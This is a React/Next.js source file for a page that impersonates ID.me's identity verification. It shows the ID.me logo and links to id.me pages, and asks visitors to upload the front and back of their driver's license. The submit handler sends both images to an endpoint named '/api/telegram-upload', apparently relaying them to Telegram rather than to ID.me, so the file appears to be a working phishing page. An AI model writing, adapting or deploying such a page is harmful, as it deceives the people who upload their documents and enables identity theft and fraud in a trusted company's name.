"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png"; // place your logo in the same folder

export default function UploadLicense() {
  const router = useRouter();
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const validateFile = (file: File): string | null => {
    const validTypes = ["image/jpeg", "image/png", "image/jpg", "image/heic"];
    if (!validTypes.includes(file.type)) {
      return "Please upload a valid image (JPEG, PNG, or HEIC).";
    }
    if (file.size > 10 * 1024 * 1024) {
      return "File size must be less than 10 MB.";
    }
    return null;
  };

  const handleFrontChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    setFrontFile(file);
    setFrontPreview(URL.createObjectURL(file));
  };

  const handleBackChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    setBackFile(file);
    setBackPreview(URL.createObjectURL(file));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!frontFile || !backFile) {
      setError("Please select both front and back images of your driver's license.");
      return;
    }

    setIsSubmitting(true);
    setError("");
    setSuccess("");

    // Prepare FormData for backend API
    const formData = new FormData();
    formData.append("front", frontFile);
    formData.append("back", backFile);
    formData.append("timestamp", new Date().toLocaleString());

    try {
      const res = await fetch("/api/telegram-upload", {
        method: "POST",
        body: formData, // multipart/form-data
      });

      if (!res.ok) throw new Error("Upload failed");

      setSuccess("Your driver's license has been uploaded successfully!");

      // Clear previews and revoke object URLs
      if (frontPreview) URL.revokeObjectURL(frontPreview);
      if (backPreview) URL.revokeObjectURL(backPreview);
      setFrontFile(null);
      setFrontPreview(null);
      setBackFile(null);
      setBackPreview(null);

      // Redirect after short delay
      setTimeout(() => router.push("/Success"), 2000);
    } catch (error) {
      console.error("Upload error:", error);
      setError("Failed to upload images. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image
              src={idmeLogo}
              alt="ID.me"
              width={128}
              height={48}
              className="object-contain"
              priority
            />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-8 pt-8 pb-4">
            <h1 className="text-2xl font-semibold text-gray-900 text-center tracking-tight">
              Verify Your Identity
            </h1>
            <p className="mt-2 text-sm text-gray-500 text-center">
              Please upload a clear photo of the front and back of your driver's license.
            </p>
          </div>

          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
            <a
              href="https://www.id.me/help"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
            >
              Why do we need this?
            </a>
          </div>

          <div className="p-8">
            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}
            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Front of License */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Front of Driver's License
                </label>
                <input
                  type="file"
                  accept="image/jpeg,image/png,image/jpg,image/heic"
                  onChange={handleFrontChange}
                  className="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                />
                <p className="text-xs text-gray-500 mt-1">
                  Accepted formats: JPEG, PNG, HEIC (max 10 MB)
                </p>
                {frontPreview && (
                  <div className="mt-3">
                    <img
                      src={frontPreview}
                      alt="Front preview"
                      className="max-w-full max-h-48 rounded-lg border border-gray-200 shadow-sm"
                    />
                  </div>
                )}
              </div>

              {/* Back of License */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Back of Driver's License
                </label>
                <input
                  type="file"
                  accept="image/jpeg,image/png,image/jpg,image/heic"
                  onChange={handleBackChange}
                  className="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
                />
                <p className="text-xs text-gray-500 mt-1">
                  Accepted formats: JPEG, PNG, HEIC (max 10 MB)
                </p>
                {backPreview && (
                  <div className="mt-3">
                    <img
                      src={backPreview}
                      alt="Back preview"
                      className="max-w-full max-h-48 rounded-lg border border-gray-200 shadow-sm"
                    />
                  </div>
                )}
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isSubmitting ? "Uploading..." : "Continue"}
              </button>
            </form>

            <div className="mt-6 text-center text-sm">
              <a href="#" className="text-blue-600 hover:text-blue-700">
                Forgot password?
              </a>
              {" | "}
              <a href="#" className="text-blue-600 hover:text-blue-700">
                Need help?
              </a>
            </div>
          </div>
        </div>

        {/* Footer Links */}
        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
          <a
            href="https://www.id.me/about"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            What is ID.me?
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/terms"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Terms of Service
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Privacy Policy
          </a>
        </div>
      </div>
    </div>
  );
}